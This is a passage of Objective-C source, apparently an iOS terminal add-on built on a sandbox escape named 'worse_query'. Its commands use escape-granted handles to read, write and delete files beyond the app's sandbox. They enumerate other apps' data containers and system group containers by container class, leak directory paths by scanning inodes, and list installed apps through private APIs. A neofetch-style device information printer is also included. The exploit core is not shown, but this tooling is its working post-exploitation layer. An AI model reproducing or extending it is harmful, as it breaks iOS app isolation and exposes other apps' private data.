            sbx_eprintf("usage: sbx_write [-a] <file> <text...>\n");
            return 1;
        }
        NSString *path = sbx_canonical([NSString stringWithUTF8String:argv[first]]);
        NSMutableString *text = [NSMutableString string];
        for (int i = first + 1; i < argc; i++) {
            if (text.length > 0) [text appendString:@" "];
            [text appendString:[NSString stringWithUTF8String:argv[i]]];
        }
        [text appendString:@"\n"];

        int64_t handle = sbx_grant_item([path stringByDeletingLastPathComponent]);
        if (handle <= 0 && !sbx_is_own_path(path)) {
            sbx_eprintf("sbx_write: cannot access parent directory (%s)\n", sbx_error_text(handle));
            return 1;
        }

        NSError *error = nil;
        BOOL ok = NO;
        if (append) {
            if (![[NSFileManager defaultManager] fileExistsAtPath:path]) {
                ok = [text writeToFile:path atomically:NO encoding:NSUTF8StringEncoding error:&error];
            } else {
                NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
                if (fh) {
                    @try {
                        [fh seekToEndOfFile];
                        [fh writeData:[text dataUsingEncoding:NSUTF8StringEncoding]];
                        [fh closeFile];
                        ok = YES;
                    } @catch (NSException *e) {
                        error = [NSError errorWithDomain:@"TerminalSBX" code:1 userInfo:@{NSLocalizedDescriptionKey: e.reason ?: @"write failed"}];
                    }
                }
            }
        } else {
            ok = [text writeToFile:path atomically:NO encoding:NSUTF8StringEncoding error:&error];
        }
        if (!ok) {
            sbx_eprintf("sbx_write: %s\n", error.localizedDescription.UTF8String);
            return 1;
        }
        sbx_printf("wrote %lu bytes to %s\n", (unsigned long)[text lengthOfBytesUsingEncoding:NSUTF8StringEncoding],
                   sbx_display(path).UTF8String);
        return 0;
    }
}

__attribute__((visibility("default")))
int sbx_rm(int argc, char **argv) {
    @autoreleasepool {
        BOOL recursive = NO;
        BOOL force = NO;
        NSString *path = nil;
        for (int i = 1; i < argc; i++) {
            if (strcmp(argv[i], "-r") == 0 || strcmp(argv[i], "-R") == 0) recursive = YES;
            else if (strcmp(argv[i], "-f") == 0) force = YES;
            else path = [NSString stringWithUTF8String:argv[i]];
        }
        if (path.length == 0) {
            sbx_eprintf("usage: sbx_rm [-r] [-f] <path>\n");
            return 1;
        }
        NSString *canonical = sbx_canonical(path);
        int64_t handle = sbx_grant_item([canonical stringByDeletingLastPathComponent]);
        if (handle <= 0 && !sbx_is_own_path(canonical)) {
            sbx_eprintf("sbx_rm: cannot access parent directory (%s)\n", sbx_error_text(handle));
            return 1;
        }

        struct stat st;
        if (lstat(canonical.fileSystemRepresentation, &st) != 0) {
            if (force) return 0;
            sbx_eprintf("sbx_rm: %s: %s\n", sbx_display(canonical).UTF8String, strerror(errno));
            return 1;
        }
        if (S_ISDIR(st.st_mode) && !recursive) {
            sbx_eprintf("sbx_rm: %s is a directory (use -r)\n", sbx_display(canonical).UTF8String);
            return 1;
        }
        NSError *error = nil;
        if (![[NSFileManager defaultManager] removeItemAtPath:canonical error:&error]) {
            sbx_eprintf("sbx_rm: %s\n", error.localizedDescription.UTF8String);
            return 1;
        }
        sbx_printf("removed %s\n", sbx_display(canonical).UTF8String);
        return 0;
    }
}

__attribute__((visibility("default")))
int sbx_hexdump(int argc, char **argv) {
    @autoreleasepool {
        long long maxBytes = 256;
        NSString *path = nil;
        for (int i = 1; i < argc; i++) {
            if (strcmp(argv[i], "-n") == 0 && i + 1 < argc) {
                maxBytes = strtoll(argv[++i], NULL, 10);
                if (maxBytes < 0) maxBytes = 0;
            } else {
                path = [NSString stringWithUTF8String:argv[i]];
            }
        }
        if (path.length == 0) {
            sbx_eprintf("usage: sbx_hexdump [-n count] <file>\n");
            return 1;
        }
        NSString *canonical = sbx_canonical(path);
        int64_t handle = sbx_grant_item(canonical);
        if (handle <= 0 && !sbx_is_own_path(canonical)) {
            sbx_eprintf("sbx_hexdump: cannot access %s (%s)\n", sbx_display(canonical).UTF8String, sbx_error_text(handle));
            return 1;
        }
        FILE *f = fopen(canonical.fileSystemRepresentation, "rb");
        if (!f) {
            sbx_eprintf("sbx_hexdump: %s: %s\n", sbx_display(canonical).UTF8String, strerror(errno));
            return 1;
        }
        unsigned char *data = malloc((size_t)maxBytes + 1);
        if (!data) { fclose(f); return 1; }
        size_t n = fread(data, 1, (size_t)maxBytes, f);
        fclose(f);
        for (size_t offset = 0; offset < n; offset += 16) {
            char hex[3 * 16 + 1];
            char ascii[17];
            size_t k = 0;
            for (size_t j = 0; j < 16; j++) {
                if (offset + j < n) {
                    unsigned char b = data[offset + j];
                    snprintf(hex + k, 4, "%02x ", b);
                    ascii[j] = (b >= 0x20 && b < 0x7f) ? (char)b : '.';
                } else {
                    snprintf(hex + k, 4, "   ");
                    ascii[j] = ' ';
                }
                k += 3;
            }
            hex[k] = '\0';
            ascii[16] = '\0';
            sbx_printf("%08zx  %s |%s|\n", offset, hex, ascii);
        }
        if (n == (size_t)maxBytes) {
            struct stat st;
            if (stat(canonical.fileSystemRepresentation, &st) == 0 && (long long)st.st_size > maxBytes) {
                sbx_printf("... (%lld bytes total, showing first %lld)\n", (long long)st.st_size, maxBytes);
            }
        }
        free(data);
        return 0;
    }
}

__attribute__((visibility("default")))
int sbx_containers(int argc, char **argv) {
    @autoreleasepool {
        NSString *root = @"/private/var/mobile/Containers/Data/Application";
        if (argc >= 2) root = sbx_canonical([NSString stringWithUTF8String:argv[1]]);
        int64_t handle = sbx_grant_mount(root);
        NSMutableArray<NSDictionary *> *children = [NSMutableArray array];
        if (handle > 0) {
            NSArray<NSString *> *entries = sbx_list_dir(root);
            for (NSString *entry in entries ?: @[]) {
                [children addObject:@{@"path": [root stringByAppendingPathComponent:entry], @"id": @""}];
            }
        }
        if (children.count == 0) {
            NSArray<NSDictionary *> *enumerated = sbx_enumerate_class(2);
            if (enumerated.count > 0) [children addObjectsFromArray:enumerated];
        }
        if (children.count == 0) {
            NSArray<NSString *> *leaked = sbx_pathleak(root, 2000000, 8.0);
            for (NSString *child in leaked ?: @[]) {
                [children addObject:@{@"path": child, @"id": @""}];
            }
        }
        if (children.count == 0) {
            sbx_eprintf("sbx_containers: cannot access or enumerate %s (%s)\n",
                        sbx_display(root).UTF8String, sbx_error_text(handle));
            return 1;
        }
        int count = 0;
        for (NSDictionary *info in children) {
            NSString *child = info[@"path"];
            if (!sbx_path_is_dir(child)) continue;
            sbx_grant_mount(child);
            NSString *bid = info[@"id"];
            if (bid.length == 0) bid = sbx_bundle_id(child);
            if (bid.length == 0) bid = child.lastPathComponent;
            sbx_printf("%s\t%s\n", bid.UTF8String, sbx_display(child).UTF8String);
            count++;
        }
        if (count == 0) {
            sbx_eprintf("sbx_containers: no containers found\n");
            return 1;
        }
        return 0;
    }
}

__attribute__((visibility("default")))
int sbx_id(int argc, char **argv) {
    @autoreleasepool {
        if (argc < 2) {
            sbx_eprintf("usage: sbx_id <container_path>\n");
            return 1;
        }
        NSString *path = sbx_canonical([NSString stringWithUTF8String:argv[1]]);
        NSFileManager *fm = [NSFileManager defaultManager];
        NSString *dataLink = [path stringByAppendingPathComponent:@"_data"];
        if ([fm fileExistsAtPath:dataLink]) path = sbx_canonical(dataLink);
        NSString *linkTarget = sbx_symlink_target(path);
        if (linkTarget.length > 0) path = linkTarget;
        int64_t handle = sbx_grant_mount(path);
        if (handle <= 0 && !sbx_is_own_path(path)) {
            sbx_eprintf("sbx_id: cannot access %s (%s)\n", sbx_display(path).UTF8String, sbx_error_text(handle));
            return 1;
        }
        NSString *bid = sbx_bundle_id(path);
        if (bid.length == 0) {
            sbx_eprintf("sbx_id: could not read container metadata\n");
            return 1;
        }
        sbx_printf("%s\n", bid.UTF8String);
        return 0;
    }
}

__attribute__((visibility("default")))
int sbx_sysgroups(int argc, char **argv) {
    @autoreleasepool {
        NSString *filter = argc >= 2 ? [NSString stringWithUTF8String:argv[1]] : nil;
        NSString *root = @"/private/var/containers/Shared/SystemGroup";
        int64_t handle = sbx_grant_mount(root);
        NSMutableArray<NSDictionary *> *children = [NSMutableArray array];
        if (handle > 0) {
            NSArray<NSString *> *entries = sbx_list_dir(root);
            for (NSString *entry in entries ?: @[]) {
                [children addObject:@{@"path": [root stringByAppendingPathComponent:entry], @"id": @""}];
            }
        }
        if (children.count == 0) {
            NSArray<NSDictionary *> *enumerated = sbx_enumerate_class(11);
            if (enumerated.count > 0) [children addObjectsFromArray:enumerated];
        }
        if (children.count == 0) {
            NSArray<NSString *> *leaked = sbx_pathleak(root, 2000000, 8.0);
            for (NSString *child in leaked ?: @[]) {
                [children addObject:@{@"path": child, @"id": @""}];
            }
        }
        if (children.count == 0) {
            sbx_eprintf("sbx_sysgroups: cannot access or enumerate %s (%s)\n",
                        sbx_display(root).UTF8String, sbx_error_text(handle));
            return 1;
        }
        int found = 0;
        for (NSDictionary *info in children) {
            NSString *child = info[@"path"];
            if (!sbx_path_is_dir(child)) continue;
            sbx_grant_mount(child);
            NSString *entry = child.lastPathComponent;
            NSString *bid = info[@"id"];
            if (bid.length == 0) bid = sbx_bundle_id(child);
            if (bid.length == 0) bid = entry;
            if (filter.length > 0 &&
                [bid rangeOfString:filter options:NSCaseInsensitiveSearch].location == NSNotFound &&
                [entry rangeOfString:filter options:NSCaseInsensitiveSearch].location == NSNotFound) {
                continue;
            }
            sbx_printf("%s\t%s\n", bid.UTF8String, sbx_display(child).UTF8String);
            found++;
        }
        if (found == 0) {
            sbx_eprintf("sbx_sysgroups: no entries%s%s\n", filter ? " matching " : "",
                        filter ? filter.UTF8String : "");
            return 1;
        }
        return 0;
    }
}

__attribute__((visibility("default")))
int sbx_enum(int argc, char **argv) {
    @autoreleasepool {
        if (argc < 2) {
            sbx_eprintf("usage: sbx_enum <container-class> [filter]\n"
                        "  classes: 2=app data, 5=app group, 8=plugin, 10=daemon, 11=system group\n");
            return 1;
        }
        uint64_t cls = strtoull(argv[1], NULL, 0);
        NSString *filter = argc >= 3 ? [NSString stringWithUTF8String:argv[2]] : nil;
        NSArray<NSDictionary *> *items = sbx_enumerate_class(cls);
        if (items.count == 0) {
            sbx_eprintf("sbx_enum: class %llu returned no containers\n", cls);
            return 1;
        }
        int shown = 0;
        for (NSDictionary *item in items) {
            NSString *path = item[@"path"];
            NSString *bid = item[@"id"];
            if (filter.length > 0 &&
                [path rangeOfString:filter options:NSCaseInsensitiveSearch].location == NSNotFound &&
                [bid rangeOfString:filter options:NSCaseInsensitiveSearch].location == NSNotFound) {
                continue;
            }
            sbx_printf("%s\t%s\n", bid.length ? bid.UTF8String : "-", sbx_display(path).UTF8String);
            shown++;
        }
        sbx_printf("%d/%lu container(s)\n", shown, (unsigned long)items.count);
        return 0;
    }
}

__attribute__((visibility("default")))
int sbx_enumclasses(int argc, char **argv) {
    (void)argc; (void)argv;
    @autoreleasepool {
        sbx_printf("containermanager enumeration by class:\n");
        for (uint64_t cls = 1; cls <= 20; cls++) {
            NSArray<NSDictionary *> *items = sbx_enumerate_class(cls);
            if (items.count > 0) {
                sbx_printf("  class %-2llu: %lu container(s)\n", cls, (unsigned long)items.count);
                NSUInteger limit = MIN(items.count, (NSUInteger)5);
                for (NSUInteger i = 0; i < limit; i++) {
                    sbx_printf("      %s\n", sbx_display(items[i][@"path"]).UTF8String);
                }
            }
        }
        return 0;
    }
}

__attribute__((visibility("default")))
int sbx_leak(int argc, char **argv) {
    @autoreleasepool {
        if (argc < 2) {
            sbx_eprintf("usage: sbx_leak <path> [max_inode] [seconds]\n");
            return 1;
        }
        NSString *path = sbx_canonical([NSString stringWithUTF8String:argv[1]]);
        uint64_t maxInode = 2000000;
        double seconds = 30.0;
        if (argc >= 3) maxInode = strtoull(argv[2], NULL, 10);
        if (argc >= 4) seconds = strtod(argv[3], NULL);
        double start = sbx_now();
        NSArray<NSString *> *items = sbx_pathleak(path, maxInode, seconds);
        if (items.count == 0) {
            sbx_eprintf("sbx_leak: no immediate children found under %s\n", sbx_display(path).UTF8String);
            return 1;
        }
        for (NSString *item in items) sbx_printf("%s\n", sbx_display(item).UTF8String);
        sbx_printf("%lu path(s) in %.2fs\n", (unsigned long)items.count, sbx_now() - start);
        return 0;
    }
}

__attribute__((visibility("default")))
int sbx_lsapps(int argc, char **argv) {
    (void)argc; (void)argv;
    @autoreleasepool {
        Class cls = NSClassFromString(@"LSApplicationWorkspace");
        if (!cls) {
            sbx_eprintf("sbx_lsapps: LSApplicationWorkspace unavailable\n");
            return 1;
        }
        id ws = [cls performSelector:NSSelectorFromString(@"defaultWorkspace")];
        if (!ws) {
            sbx_eprintf("sbx_lsapps: defaultWorkspace unavailable\n");
            return 1;
        }
        NSArray *apps = [ws performSelector:NSSelectorFromString(@"allInstalledApplications")];
        if (![apps isKindOfClass:[NSArray class]]) {
            sbx_eprintf("sbx_lsapps: allInstalledApplications unavailable\n");
            return 1;
        }
        int count = 0;
        for (id app in apps) {
            NSString *bid = [app performSelector:NSSelectorFromString(@"bundleIdentifier")];
            NSURL *url = [app performSelector:NSSelectorFromString(@"dataContainerURL")];
            if ([bid isKindOfClass:[NSString class]] && [url isKindOfClass:[NSURL class]]) {
                sbx_printf("%s\t%s\n", bid.UTF8String, sbx_display(url.path).UTF8String);
                count++;
            }
        }
        sbx_printf("%d app data container(s)\n", count);
        return count > 0 ? 0 : 1;
    }
}

__attribute__((visibility("default")))
int sbx_probe(int argc, char **argv) {
    (void)argc; (void)argv;
    @autoreleasepool {
        int ok = 0;
        sbx_printf("Probing every path supported by worse_query:\n");
        for (NSDictionary *mp in sbx_mount_points()) {
            NSString *root = mp[@"root"];
            NSString *name = mp[@"name"];
            int64_t handle = sbx_grant_mount(root);
            NSArray *entries = handle > 0 ? sbx_list_dir(root) : nil;
            NSArray *enumerated = nil;
            if (entries == nil) {
                enumerated = sbx_pathleak(root, 2000000, 6.0);
            }
            if (handle > 0 || entries.count > 0 || enumerated.count > 0) {
                sbx_printf("  [OK]   %-14s %-58s", name.UTF8String,
                           sbx_display(root).UTF8String);
                if (handle > 0) sbx_printf(" handle=%lld", handle);
                if (entries) sbx_printf(" entries=%lu", (unsigned long)entries.count);
                if (enumerated) sbx_printf(" fsgetpath=%lu", (unsigned long)enumerated.count);
                sbx_printf("\n");
                sbx_mark_root(root);
                ok++;
            } else {
                sbx_printf("  [FAIL] %-14s %-58s %s (%lld)\n", name.UTF8String,
                           sbx_display(root).UTF8String, sbx_error_text(handle), handle);
            }
        }
        sbx_printf("%d/%lu supported roots accessible\n", ok, (unsigned long)sbx_mount_points().count);
        return ok > 0 ? 0 : 1;
    }
}

__attribute__((visibility("default")))
int sbx_paths(int argc, char **argv) {
    (void)argc; (void)argv;
    @autoreleasepool {
        sbx_printf("worse_query supported sandbox paths (iOS 26.0–26.7.2 / 27.2):\n");
        sbx_printf("  %-20s %-56s %s\n", "MOUNT", "PATH", "STATUS");
        for (NSDictionary *mp in sbx_mount_points()) {
            NSString *path = mp[@"root"];
            sbx_printf("  %-20s %-56s %s\n",
                       [mp[@"name"] UTF8String],
                       sbx_display(path).UTF8String,
                       sbx_has_handle_for(path) ? "granted" : (sbx_path_exists(path) ? "not granted" : "not present"));
        }
        return 0;
    }
}

__attribute__((visibility("default")))
int sbx_bswelcome(int argc, char **argv) {
    (void)argc; (void)argv;
    @autoreleasepool {
        sbx_printf("\033[95mTerminal\033[0m — a-Shell + worse_query\n");
        sbx_printf("waiting for sandbox escape to finish...\n");
        for (int i = 0; i < 150; i++) {
            pthread_mutex_lock(&g_lock);
            BOOL done = g_mount_done;
            pthread_mutex_unlock(&g_lock);
            if (done) break;
            usleep(100000);
        }
        pthread_mutex_lock(&g_lock);
        int64_t mounted = g_mount_mounted;
        int64_t failed = g_mount_failed;
        pthread_mutex_unlock(&g_lock);
        sbx_printf("\033[95m[ready]\033[0m %lld mounted, %lld failed. Sandbox at ~/Documents/_sandbox/\n",
                   mounted, failed);
        return 0;
    }
}

// ---------------------------------------------------------------------------
// neofetch
// ---------------------------------------------------------------------------

static NSString *sbx_sysctl_string(const char *name) {
    size_t size = 0;
    if (sysctlbyname(name, NULL, &size, NULL, 0) != 0 || size == 0) return nil;
    char *buffer = (char *)malloc(size + 1);
    if (!buffer) return nil;
    if (sysctlbyname(name, buffer, &size, NULL, 0) != 0) {
        free(buffer);
        return nil;
    }
    buffer[size] = '\0';
    NSString *value = [NSString stringWithUTF8String:buffer];
    free(buffer);
    return value;
}


static NSString *sbx_format_size(unsigned long long bytes) {
    double gib = (double)bytes / 1073741824.0;
    if (gib >= 1.0) return [NSString stringWithFormat:@"%.1f GiB", gib];
    double mib = (double)bytes / 1048576.0;
    return [NSString stringWithFormat:@"%.0f MiB", mib];
}

static NSDictionary *sbx_device_snapshot(void) {
    __block NSString *name = @"iPhone";
    __block NSString *model = @"iPhone";
    __block NSString *system = @"iOS";
    __block float batteryLevel = -1.0f;
    __block NSInteger batteryState = 0;
    __block CGSize screenSize = CGSizeZero;
    __block CGFloat screenScale = 1.0;

    void (^snapshot)(void) = ^{
        UIDevice *device = [UIDevice currentDevice];
        device.batteryMonitoringEnabled = YES;
        if (device.name.length > 0) name = [device.name copy];
        if (device.model.length > 0) model = [device.model copy];
        if (device.systemVersion.length > 0) system = [device.systemVersion copy];
        batteryLevel = device.batteryLevel;
        batteryState = (NSInteger)device.batteryState;
        UIScreen *screen = [UIScreen mainScreen];
        if (screen != nil) {
            screenSize = screen.bounds.size;
            screenScale = screen.scale;
        }
    };
    if ([NSThread isMainThread]) snapshot();
    else dispatch_sync(dispatch_get_main_queue(), snapshot);

    return @{
        @"name": name,
        @"model": model,
        @"system": system,
        @"batteryLevel": @(batteryLevel),
        @"batteryState": @(batteryState),
        @"screenWidth": @(screenSize.width * screenScale),
        @"screenHeight": @(screenSize.height * screenScale),
        @"screenScale": @(screenScale),
    };
}

static NSString *sbx_cpu_arch(void) {
    int32_t cputype = 0;
    size_t size = sizeof(cputype);
    if (sysctlbyname("hw.cputype", &cputype, &size, NULL, 0) != 0) return @"arm64";
    int32_t subtype = 0;
    size = sizeof(subtype);
    sysctlbyname("hw.cpusubtype", &subtype, &size, NULL, 0);
    if (cputype == 0x0100000C) { // CPU_TYPE_ARM64
        return subtype == 2 ? @"arm64e" : @"arm64";
    }
    return [NSString stringWithFormat:@"cputype %d", cputype];
}

static NSString *sbx_local_ip(void) {
    struct ifaddrs *interfaces = NULL;
    if (getifaddrs(&interfaces) != 0) return nil;
    NSString *result = nil;
    for (struct ifaddrs *ifa = interfaces; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL || ifa->ifa_addr->sa_family != AF_INET) continue;
        NSString *name = [NSString stringWithUTF8String:ifa->ifa_name];
        if (![name isEqualToString:@"en0"] && ![name isEqualToString:@"en1"]) continue;
        char host[NI_MAXHOST];
        if (getnameinfo(ifa->ifa_addr, sizeof(struct sockaddr_in),
                        host, sizeof(host), NULL, 0, NI_NUMERICHOST) == 0) {
            result = [NSString stringWithUTF8String:host];
            break;
        }
    }
    freeifaddrs(interfaces);
    return result;
}

__attribute__((visibility("default")))
int sbx_neofetch(int argc, char **argv) {
    (void)argv;
    @autoreleasepool {
        if (argc > 1 && (strcmp(argv[1], "--help") == 0 || strcmp(argv[1], "-h") == 0)) {
            sbx_printf("usage: neofetch\n"
                       "  Compact system information for Terminal / a-Shell.\n");
            return 0;
        }

        NSProcessInfo *pi = [NSProcessInfo processInfo];
        NSDictionary *device = sbx_device_snapshot();
        NSString *machine = sbx_sysctl_string("hw.machine") ?: @"arm64";
        NSString *hardware = sbx_sysctl_string("hw.model") ?: @"unknown";
        NSString *build = sbx_sysctl_string("kern.osversion") ?: @"";
        NSString *product = sbx_sysctl_string("kern.osproductversion") ?: device[@"system"];
        NSString *bundleVersion = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleShortVersionString"] ?: @"2.3.2";

        struct utsname uts;
        memset(&uts, 0, sizeof(uts));
        uname(&uts);

        unsigned long long totalMemory = pi.physicalMemory;
        unsigned long long appMemory = 0;
        struct mach_task_basic_info taskInfo;
        mach_msg_type_number_t taskCount = MACH_TASK_BASIC_INFO_COUNT;
        if (task_info(mach_task_self(), MACH_TASK_BASIC_INFO,
                      (task_info_t)&taskInfo, &taskCount) == KERN_SUCCESS) {
            appMemory = taskInfo.resident_size;
        }

        struct statfs sfs;
        unsigned long long diskTotal = 0, diskFree = 0;
        if (statfs(NSHomeDirectory().fileSystemRepresentation, &sfs) == 0) {
            diskTotal = (unsigned long long)sfs.f_blocks * (unsigned long long)sfs.f_bsize;
            diskFree = (unsigned long long)sfs.f_bavail * (unsigned long long)sfs.f_bsize;
        }

        long long uptime = (long long)pi.systemUptime;
        long long days = uptime / 86400;
        long long hours = (uptime % 86400) / 3600;
        long long minutes = (uptime % 3600) / 60;
        NSString *uptimeText;
        if (days > 0) {
            uptimeText = [NSString stringWithFormat:@"%lld day%@, %lld hour%@, %lld min%@",
                          days, days == 1 ? @"" : @"s",
                          hours, hours == 1 ? @"" : @"s",
                          minutes, minutes == 1 ? @"" : @"s"];
        } else if (hours > 0) {
            uptimeText = [NSString stringWithFormat:@"%lld hour%@, %lld min%@",
                          hours, hours == 1 ? @"" : @"s",
                          minutes, minutes == 1 ? @"" : @"s"];
        } else {
            uptimeText = [NSString stringWithFormat:@"%lld min%@", minutes, minutes == 1 ? @"" : @"s"];
        }

        NSString *thermal = @"Nominal";
        switch (pi.thermalState) {
            case NSProcessInfoThermalStateFair: thermal = @"Fair"; break;
            case NSProcessInfoThermalStateSerious: thermal = @"Serious"; break;
            case NSProcessInfoThermalStateCritical: thermal = @"Critical"; break;
            default: break;
        }

        float battery = [device[@"batteryLevel"] floatValue];
        NSInteger batteryState = [device[@"batteryState"] integerValue];
        NSString *batteryText = @"unknown";
        if (battery >= 0.0f) {
            NSString *state = @"unplugged";
            if (batteryState == UIDeviceBatteryStateCharging) state = @"charging";
            else if (batteryState == UIDeviceBatteryStateFull) state = @"full";
            else if (batteryState == UIDeviceBatteryStateUnknown) state = @"unknown";
            batteryText = [NSString stringWithFormat:@"%d%% (%@)", (int)(battery * 100.0f + 0.5f), state];
        }

        CGFloat width = [device[@"screenWidth"] doubleValue];
        CGFloat height = [device[@"screenHeight"] doubleValue];
        CGFloat scale = [device[@"screenScale"] doubleValue];
        NSString *ip = sbx_local_ip();

        // Apple mark from neofetch's compact "mac_small" ASCII art.
        sbx_printf("\033[1;32m       .:'\033[0m\n");
        sbx_printf("\033[1;32m    _ :'_\033[0m\n");
        sbx_printf("\033[1;33m .'`_`-'_``.\033[0m\n");
        sbx_printf("\033[1;33m:________.-'\033[0m\n");
        sbx_printf("\033[1;35m:_______:\033[0m\n");
        sbx_printf("\033[1;35m:_______:\033[0m\n");
        sbx_printf("\033[1;34m :_______:\033[0m\n");
        sbx_printf("\033[1;34m  `._.-._.'\033[0m\n");
        sbx_printf("\033[1;36m  Terminal · a-Shell %s\033[0m\n\n", bundleVersion.UTF8String);

        sbx_printf("\033[1;35m%s@%s\033[0m\n", NSUserName().UTF8String,
                   [(NSString *)device[@"name"] UTF8String]);
        sbx_printf("\033[1;36m-----------------------------\033[0m\n");

        NSString *osName = [product hasPrefix:@"iOS"] ? product : [@"iOS " stringByAppendingString:product];
        if (build.length > 0) {
            sbx_printf("\033[1;36m  %-10s\033[0m %s (%s)\n", "OS", osName.UTF8String, build.UTF8String);
        } else {
            sbx_printf("\033[1;36m  %-10s\033[0m %s\n", "OS", osName.UTF8String);
        }
        sbx_printf("\033[1;36m  %-10s\033[0m %s\n", "Host",
                   [(NSString *)device[@"name"] UTF8String]);
        if (hardware.length > 0 && ![hardware isEqualToString:@"unknown"]) {
            sbx_printf("\033[1;36m  %-10s\033[0m %s (%s)\n", "Model",
                       machine.UTF8String, hardware.UTF8String);
        } else {
            sbx_printf("\033[1;36m  %-10s\033[0m %s\n", "Model", machine.UTF8String);
        }
        sbx_printf("\033[1;36m  %-10s\033[0m %s %s\n", "Kernel", uts.sysname, uts.release);
        sbx_printf("\033[1;36m  %-10s\033[0m %s\n", "Uptime", uptimeText.UTF8String);
        sbx_printf("\033[1;36m  %-10s\033[0m a-Shell %s · Terminal\n", "Shell", bundleVersion.UTF8String);
        sbx_printf("\033[1;36m  %-10s\033[0m %.0fx%.0f @%.0fx\n", "Resolution", width, height, scale);
        sbx_printf("\033[1;36m  %-10s\033[0m %lu cores · %s\n", "CPU",
                   (unsigned long)pi.processorCount, sbx_cpu_arch().UTF8String);
        id<MTLDevice> gpu = MTLCreateSystemDefaultDevice();
        if (gpu.name.length > 0) {
            sbx_printf("\033[1;36m  %-10s\033[0m %s\n", "GPU", gpu.name.UTF8String);
        }
        sbx_printf("\033[1;36m  %-10s\033[0m %s total · %s app\n", "Memory",
                   sbx_format_size(totalMemory).UTF8String, sbx_format_size(appMemory).UTF8String);
        if (diskTotal > 0) {
            sbx_printf("\033[1;36m  %-10s\033[0m %s free / %s\n", "Disk",
                       sbx_format_size(diskFree).UTF8String, sbx_format_size(diskTotal).UTF8String);
        }
        sbx_printf("\033[1;36m  %-10s\033[0m %s\n", "Battery", batteryText.UTF8String);
        sbx_printf("\033[1;36m  %-10s\033[0m %s%s\n", "Thermal", thermal.UTF8String,
                   pi.lowPowerModeEnabled ? " · low power" : "");
        sbx_printf("\033[1;36m  %-10s\033[0m %s\n", "Locale",
                   [[NSLocale currentLocale].localeIdentifier UTF8String]);
        sbx_printf("\033[1;36m  %-10s\033[0m %s\n", "Timezone",
                   [[NSTimeZone localTimeZone].name UTF8String]);
        if (ip.length > 0) {
            sbx_printf("\033[1;36m  %-10s\033[0m %s\n", "IP", ip.UTF8String);
        }
        return 0;
    }
}
